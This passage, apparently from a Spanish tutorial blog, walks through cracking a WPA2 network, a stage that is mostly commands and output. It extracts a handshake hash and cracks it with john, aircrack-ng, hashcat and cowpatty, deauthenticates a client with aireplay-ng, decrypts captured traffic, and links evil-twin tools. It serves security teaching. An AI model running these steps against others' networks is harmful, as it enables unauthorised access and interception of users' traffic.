+34304 184.505888 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
+34305 184.506479 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
+34306 184.507047 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
+34307 184.507682 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
+34308 184.508256 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
+34309 184.508876 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
+34310 184.509440 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
+37955 193.360020 1a:58:18:4e:8a:68 → c6:bf:fd:55:e2:f7 802.11 65 Authentication, SN=2395, FN=0, Flags=........
+37957 193.369268 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3142, FN=0, Flags=........
+</code></pre></div></div>
+<ul>
+<li>De esta forma filtramos por los paquetes de <strong>Deauthentication</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==12&quot; 2&gt;/dev/null | tail -n 10
+37924 191.278041 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, SN=1012, FN=0, Flags=........
+37925 191.280473    Broadcast → c6:bf:fd:55:e2:f7 802.11 26 Deauthentication, SN=1013, FN=0, Flags=........
+37926 191.281691 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, SN=1012, FN=0, Flags=........
+37927 191.282669    Broadcast → c6:bf:fd:55:e2:f7 802.11 26 Deauthentication, SN=1013, FN=0, Flags=........
+37929 191.283940 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, SN=1014, FN=0, Flags=........
+37930 191.285588 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, SN=1014, FN=0, Flags=........
+37931 191.286318    Broadcast → c6:bf:fd:55:e2:f7 802.11 26 Deauthentication, SN=1015, FN=0, Flags=........
+37933 191.290187 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, SN=1016, FN=0, Flags=........
+37934 191.290197    Broadcast → c6:bf:fd:55:e2:f7 802.11 26 Deauthentication, SN=1015, FN=0, Flags=........
+37935 191.293178 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, SN=1016, FN=0, Flags=........
+</code></pre></div></div>
+<ul>
+<li>Este es para filtrar por los paquetes de tipo <strong>Disassociate</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==10&quot; 2&gt;/dev/null
+ 9879 137.777670 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 26 Disassociate, SN=3092, FN=0, Flags=........
+ 9880 137.778488 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 26 Disassociate, SN=3092, FN=0, Flags=....R...
+ 9881 137.779021 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 26 Disassociate, SN=3092, FN=0, Flags=....R...
+ 9882 137.779431 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 26 Disassociate, SN=3092, FN=0, Flags=....R...
+ 9883 137.780339 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 26 Disassociate, SN=3092, FN=0, Flags=....R...
+</code></pre></div></div>
+<ul>
+<li>Este es para filtrar por los <strong>ACK</strong> este paquete se utiliza para confirmar que se ah recibido con éxito un segmento de datos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==29&quot; 2&gt;/dev/null | tail -n 5
+39650 241.336497              → c6:bf:fd:55:e2:f7 (c6:bf:fd:55:e2:f7) (RA) 802.11 10 Acknowledgement, Flags=........
+39652 241.352849              → 1a:58:18:4e:8a:68 (1a:58:18:4e:8a:68) (RA) 802.11 10 Acknowledgement, Flags=........
+39656 241.673815              → Guangzho_d1:71:a4 (bc:fa:b8:d1:71:a4) (RA) 802.11 10 Acknowledgement, Flags=........
+39658 241.735049              → Guangzho_d1:71:a4 (bc:fa:b8:d1:71:a4) (RA) 802.11 10 Acknowledgement, Flags=........
+39660 241.995757              → HonHaiPr_48:6c:cf (84:4b:f5:48:6c:cf) (RA) 802.11 10 Acknowledgement, Flags=........
+</code></pre></div></div>
+<h2 id="extraccion-del-hash-en-el-handshake">Extraccion del Hash en el Handshake</h2>
+<ul>
+<li>La herramienta <code>aircrack-ng</code> cuenta con un parámetro que nos va a ayudar a hacer todo esto.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ aircrack-ng --help | grep J
+      -J &lt;file&gt;  : create Hashcat file (HCCAP)
+</code></pre></div></div>
+<ul>
+<li>Esto lo que hace es extraernos la información mas importante.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ aircrack-ng -J newcap Captura-01.cap
+Reading packets, please wait...
+Opening Captura-01.cap
+Read 39663 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  C6:BF:FD:55:E2:F7  MiguelWifi                WPA (1 handshake)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening Captura-01.cap
+Read 39663 packets.
+
+1 potential targets
+
+
+
+Building Hashcat file...
+
+[*] ESSID (length: 10): MiguelWifi
+[*] Key version: 2
+[*] BSSID: C6:BF:FD:55:E2:F7
+[*] STA: 1A:58:18:4E:8A:68
+[*] anonce:
+    72 7A C7 2C 11 C1 30 60 AA 8B 61 FD 40 8C 05 AC 
+    EC A2 CF D6 F6 73 4C 56 F4 8A 2E 75 4A F5 CA D3 
+[*] snonce:
+    BA 4B AB 58 FC D9 87 16 2B DB BB BC A7 2B 48 7D 
+    F2 DA 9B F1 5B 3E 81 0F 44 D1 B6 B6 FF E9 7E EF 
+[*] Key MIC:
+    1A C0 6E C3 4B B6 91 93 E0 29 04 7C BA 1C 4A 35
+[*] eapol:
+    02 03 00 75 02 01 0A 00 10 00 00 00 00 00 00 00 
+    01 BA 4B AB 58 FC D9 87 16 2B DB BB BC A7 2B 48 
+    7D F2 DA 9B F1 5B 3E 81 0F 44 D1 B6 B6 FF E9 7E 
+    EF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
+    04 01 00 00 0F AC 02 0C 00 
+
+Successfully written to newcap.hccap
+</code></pre></div></div>
+<ul>
+<li>Ahora con <code>hccap2john</code> le vamos a pasar la captura que creamos y lo vamos a exportar a otro archivo que hay ya va a estar el hash final con la contraseña encriptada.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ hccap2john newcap.hccap &gt; finalhash
+</code></pre></div></div>
+<ul>
+<li>Ahora si lo mostramos vamos a ver el <strong>hash</strong> de la red inlambrica.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cat finalhash
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: finalhash
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ MiguelWifi:$WPAPSK$MiguelWifi#lfzxJS9r4ZUMHcdciYifKDnNVlMfqviwdmh6TT9Oaz3PDc2DFB4qhjzdTixmSgQg2Q2kM8e9MTp.X.Kgv89DpjNnH
+       │ 3PoWWtpGjL8ok61.5I0.Ec.2........../iYifKDnNVlMfqviwdmh6TT9Oaz3PDc2DFB4qhjzdTiw.........................................
+       │ ........................3X.I.E..1uk2.E..1uk2.E..1uk01..................................................................
+       │ .................................................................................................................../t..
+       │ ...U.../f.PgB9hd4Hs0Y2T9cQGXI:1a58184e8a68:c6bffd55e2f7:c6bffd55e2f7::WPA2:newcap.hccap
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div>
+<h1>Fuerza bruta con John</h1>
+<ul>
+<li>Para crackearla contraseña es muy fácil simplemente hacemos esto en mi caso usare el <code>rockyou.txt</code> ya que la contraseña esta en el diccionario.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ john -w:/usr/share/wordlists/rockyou.txt finalhash
+Warning: detected hash type &quot;wpapsk&quot;, but the string is also recognized as &quot;wpapsk-pmk&quot;
+Use the &quot;--format=wpapsk-pmk&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (wpapsk, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 512/512 AVX512BW 16x])
+Cost 1 (key version [0:PMKID 1:WPA 2:WPA2 3:802.11w]) is 2 for all loaded hashes
+Will run 2 OpenMP threads
+Note: Minimum length forced to 2 by format
+Press 'q' or Ctrl-C to abort, almost any other key for status
+manchester       (MiguelWifi)
+1g 0:00:00:00 DONE (2023-09-12 18:45) 3.125g/s 1600p/s 1600c/s 1600C/s jeffrey..letmein
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+<h1>Fuerza bruta con aircrack-ng</h1>
+<ul>
+<li>Bueno también se puede hacer usando la propia herramienta <code>aircrack-ng</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">
+                               Aircrack-ng 1.6 
+
+      [00:00:01] 435/10303727 keys tested (587.39 k/s) 
+
+      Time left: 4 hours, 52 minutes, 20 seconds                 0.00%
+
+                          KEY FOUND! [ manchester ]
+
+
+      Master Key     : 55 01 AE 01 39 05 DF 0B 58 9B EF 29 56 27 80 10 
+                       E0 DE D9 00 AD E5 62 96 0C 59 9B 1E 4A 0E B5 B7 
+
+      Transient Key  : 40 2F 55 3D 19 28 BD 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      EAPOL HMAC     : 1A C0 6E C3 4B B6 91 93 E0 29 04 7C BA 1C 4A 35 
+</code></pre></div></div>
+<h1>Fuerza bruta con Hashcat</h1>
+<ul>
+<li>Ahora lo haremos con <strong>Hashcat</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ hashcat -h | grep -i wpa
+   2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols
+   2501 | WPA-EAPOL-PMK                                    | Network Protocols
+  22000 | WPA-PBKDF2-PMKID+EAPOL                           | Network Protocols
+  22001 | WPA-PMK-PMKID+EAPOL                              | Network Protocols
+  16800 | WPA-PMKID-PBKDF2                                 | Network Protocols
+  16801 | WPA-PMKID-PMK      
+</code></pre></div></div>
+<ul>
+<li>La herramienta <code>aircrack-ng</code> cuenta con un parámetro para crear un archivo donde este el <strong>hash</strong> y <code>aircrack-ng</code> lo pueda <strong>crackear</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ aircrack-ng --help | grep j | tail -n 1
+      -j &lt;file&gt;  : create Hashcat v3.6+ file (HCCAPX)
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ aircrack-ng -j hashcap Captura-01.cap
+Reading packets, please wait...
+Opening Captura-01.cap
+Read 39663 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  C6:BF:FD:55:E2:F7  MiguelWifi                WPA (1 handshake)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening Captura-01.cap
+Read 39663 packets.
+
+1 potential targets
+
+
+
+Building Hashcat (3.60+) file...
+
+[*] ESSID (length: 10): MiguelWifi
+[*] Key version: 2
+[*] BSSID: C6:BF:FD:55:E2:F7
+[*] STA: 1A:58:18:4E:8A:68
+[*] anonce:
+    72 7A C7 2C 11 C1 30 60 AA 8B 61 FD 40 8C 05 AC 
+    EC A2 CF D6 F6 73 4C 56 F4 8A 2E 75 4A F5 CA D3 
+[*] snonce:
+    BA 4B AB 58 FC D9 87 16 2B DB BB BC A7 2B 48 7D 
+    F2 DA 9B F1 5B 3E 81 0F 44 D1 B6 B6 FF E9 7E EF 
+[*] Key MIC:
+    1A C0 6E C3 4B B6 91 93 E0 29 04 7C BA 1C 4A 35
+[*] eapol:
+    02 03 00 75 02 01 0A 00 10 00 00 00 00 00 00 00 
+    01 BA 4B AB 58 FC D9 87 16 2B DB BB BC A7 2B 48 
+    7D F2 DA 9B F1 5B 3E 81 0F 44 D1 B6 B6 FF E9 7E 
+    EF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
+    04 01 00 00 0F AC 02 0C 00 
+
+Successfully written to hashcap.hccapx
+</code></pre></div></div>
+<ul>
+<li>Y ahora simplemente le indicamos el modo y el archivo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ hashcat -m 2500 -d 1 hashcap.hccapx /usr/share/wordlists/rockyou.txt --force
+hashcat (v6.1.1) starting...
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 2855/2919 MB (1024 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 8
+Maximum password length supported by kernel: 63
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Slow-Hash-SIMD-LOOP
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 64 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 3 secs
+
+c6bffd55e2f7:1a58184e8a68:MiguelWifi:manchester  
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: WPA-EAPOL-PBKDF2
+Hash.Target......: MiguelWifi (AP:c6:bf:fd:55:e2:f7 STA:1a:58:18:4e:8a:68)
+Time.Started.....: Tue Sep 12 19:02:01 2023, (1 sec)
+Time.Estimated...: Tue Sep 12 19:02:02 2023, (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     2044 H/s (7.15ms) @ Accel:1024 Loops:128 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 6595/14344385 (0.05%)
+Rejected.........: 4547/6595 (68.95%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: 123456789 -&gt; zaq12wsx
+
+Started: Tue Sep 12 19:01:04 2023
+Stopped: Tue Sep 12 19:02:03 2023
+</code></pre></div></div>
+<h1>Cracking cowpatty</h1>
+<ul>
+<li>Estas es otra alternativa.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cowpatty -f /usr/share/wordlists/rockyou.txt -r Captura-01.cap -s MiguelWifi
+cowpatty 4.8 - WPA-PSK dictionary attack. &lt;jwright@hasborg.com&gt;
+
+Collected all necessary data to mount crack against WPA2/PSK passphrase.
+Starting dictionary attack.  Please be patient.
+
+The PSK is &quot;manchester&quot;.
+
+128 passphrases tested in 0.27 seconds:  465.61 passphrases/second
+</code></pre></div></div>
+<h2 id="espionaje">Espionaje</h2>
+<ul>
+<li><p>Bueno para poder entender todo esto vamos a comenzar capturando un <strong>handshake</strong>.</p>
+</li>
+<li><p>Vamos a ponernos otra vez monitoreando el <strong>AP</strong> y lo vamos a exportar a un fichero.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ airodump-ng -w Captura --bssid C6:BF:FD:55:E2:F7 --channel 1 wlan0mon 
+</code></pre></div></div>
+<ul>
+<li>Hay vemos otra vez que hay un cliente.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/xd.png">
+</p>
+
+<ul>
+<li>Ahora vamos a expulsar al cliente de la red y esperamos a que se reconecte para obtener el <strong>Handshake</strong> en este caso voy a indicar la <strong>MAC</strong> del cliente para que mas rapido.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ aireplay-ng -0 0 -e MiguelWifi -c 84:4B:F5:48:6C:CF wlan0mon
+</code></pre></div></div>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/xd1.png">
+</p>
+
+<ul>
+<li><p>Si seguimos en escucha y desde el lado del cliente nos autenticamos a alguna pagina como <strong>facebook.com</strong> u alguna otra pensaremos que podríamos ver el trafico <strong>http</strong> y la respuesta es si se puede pero como va encriptado no podemos ver los paquetes para ver todo esto debes de generar un <strong>handshake</strong> previamente.</p>
+</li>
+<li><p>Pero para desencriptar una captura en base a una contraseña que proporciones.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ airdecap-ng --help
+
+  Airdecap-ng 1.6  - (C) 2006-2020 Thomas d'Otreppe
+  https://www.aircrack-ng.org
+
+  usage: airdecap-ng [options] &lt;pcap file&gt;
+
+  Common options:
+      -l         : don't remove the 802.11 header
+      -b &lt;bssid&gt; : access point MAC address filter
+      -e &lt;essid&gt; : target network SSID
+      -o &lt;fname&gt; : output file for decrypted packets (default &lt;src&gt;-dec)
+
+  WEP specific option:
+      -w &lt;key&gt;   : target network WEP key in hex
+      -c &lt;fname&gt; : output file for corrupted WEP packets (default &lt;src&gt;-bad)
+
+  WPA specific options:
+      -p &lt;pass&gt;  : target network WPA passphrase
+      -k &lt;pmk&gt;   : WPA Pairwise Master Key in hex
+
+      --help     : Displays this usage screen
+
+  If your capture contains any WDS packet, you must specify the -b
+  option (otherwise only packets destined to the AP will be decrypted)
+</code></pre></div></div>
+<ul>
+<li>Para usarla es fácil simplemente le indicamos la contraseña y la captura y como vemos se desencriptaron muchos paquetes.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ airdecap-ng -e MiguelWifi -p manchester Captura-02.cap
+Total number of stations seen           12
+Total number of packets read        168309
+Total number of WEP data packets         0
+Total number of WPA data packets      1087
+Number of plaintext data packets         0
+Number of decrypted WEP  packets         0
+Number of corrupted WEP  packets         0
+Number of decrypted WPA  packets       855
+Number of bad TKIP (WPA) packets         0
+Number of bad CCMP (WPA) packets         0
+</code></pre></div></div>
+<ul>
+<li>Esto nos crea una nueva captura llamada <strong>Captura-02-dec.cap</strong> vemos que se emitio una respuesta que es de donde me intente conectar y dijo que la cuenta no existía.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tshark -r Captura-02-dec.cap -Y &quot;http&quot; 2&gt;/dev/null
+    1   0.000000 142.250.177.3 → 192.168.43.202 OCSP 779 Response
+</code></pre></div></div>
+<ul>
+<li>Y de esta forma podemos ver la estructura de la data.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tshark -r Captura-03-dec.cap -Y &quot;http&quot; -Tfields -e tcp.payload 2&gt;/dev/null | xxd -ps -r
+HTTP/1.1 200 OK
+Server: scaffolding on HTTPServer2
+Content-Length: 472
+X-XSS-Protection: 0
+X-Frame-Options: SAMEORIGIN
+Date: Wed, 13 Sep 2023 01:42:59 GMT
+Cache-Control: public, max-age=14400
+Content-Type: application/ocsp-response
+Age: 2054
+
+0
+0	*H00%W*]S20230912234636Z0t0r0J0	+PSCIA]e7nHcZ%W*]SX7/#g20230912234636Z20230919224635Z0
+`!'vL)*ETOCZ),ź*bK72\QkļPxhT-+,:gq0aqs+gGaMXԚ&quot;io*H^r^M&gt;м	E!gG$d#bg/n&quot;jL@cu琲hnNoRjͩõM&quot;c^k_#ѿm1#
+</code></pre></div></div>
+<ul>
+<li>En dado caso si quisiéramos ver algo mas como el usuario y la contraseña de alguna pagina web donde se conecte el cliente podemos hacerlo simplemente es seguir en escuchar y hacer los mismos procesos en este caso yo no lo voy a hacer por que estoy fue a modo de ejemplo.</li>
+</ul>
+<h2 id="evil-twin-attack">Evil Twin Attack</h2>
+<ul>
+<li><p>Este ataque nos permite obtener la contraseña de la red inalambrica pero de forma alternativa vamos a crear una <strong>fake</strong> <strong>AP</strong> que opere en el mismo canal para que el cliente se conecte al de nosotros usando una plantilla este ataque se puede hacer tanto manual como automatizado con alguna herramienta recomiendo estas <a href="https://github.com/D3Ext/WEF">https://github.com/D3Ext/WEF</a> y <a href="https://github.com/s4vitar/evilTrust">https://github.com/s4vitar/evilTrust</a>.</p>
+</li>
+<li><p>Una vez instalada la herramienta tenemos estos parámetros aqui te dejo un <strong>POST</strong> del propio creador de la herramienta <a href="https://d3ext.github.io/posts/Curso/#ataque-evil-twin">https://d3ext.github.io/posts/Curso/#ataque-evil-twin</a>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ wef -h
+ __      _____ ___ 
+ \ \    / / __| __|
+  \ \/\/ /| _|| _| 
+   \_/\_/ |___|_|  
+
+[WEF] Wi-Fi Exploitation Framework 1.2
+
+[*] Interfaces:
+	br-9deedf958a2c
+	docker0
+	ens33
+
+Required parameters:
+	-i, --interface) 	The name of your network card interface in managed mode
+
+Optional parameters:
+	-v, --verbose) 		Show more info during the attacks (recommended)
+	-h, --help) 		Show this help panel
+	--version) 		Print the version and exit
+	-s) 			Set tool language to spanish
+</code></pre></div></div>
+<ul>
+<li>Si quieres aprender a hacerlo manual puedes ver los pasos aquí <a href="https://s4vitar.github.io/oswp-preparacion/#">https://s4vitar.github.io/oswp-preparacion/#</a>.</li>
+</ul>
+<blockquote>
+<p>En algunos casos el <strong>Fake AP</strong> no va hacer estable ya que <code>airbase-ng</code> no genera puntos de acceso estables y usar una antena <strong>Alfa</strong> funciona por eso se usan mucho las herramientas automatizadas</p>
+</blockquote>
+<h2 id="ataques-a-redes-sin-clientes">Ataques a redes sin clientes</h2>
+<ul>
+<li>Para este ataque no es necesario que allá clientes conectados al <strong>AP</strong> lo primero que vamos a hacer es usar <code>hcxdumptool</code> este ataque es muy fácil y rápido.</li>
+</ul>
